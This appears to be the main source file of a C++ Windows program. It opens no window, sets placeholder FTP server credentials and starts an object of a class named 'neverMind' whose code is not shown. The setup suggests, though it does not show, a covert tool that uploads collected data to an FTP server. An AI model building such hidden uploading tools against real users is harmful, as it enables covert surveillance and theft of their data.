#include <Windows.h>
#include <string>
#include <iostream>
#include "neverMind.h"

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR szCmdLine, int CmdShow)
{
    // define ftp server creds
    // made them const so that they can't be changed elsewhere in the code, but feel free to modify
    const std::string host = "host";
    const std::string username = "username";
    const std::string password = "password";

    // use neverMind constructor and create an object M
    neverMind M(host, username, password);
    M.start();

    return 0;
}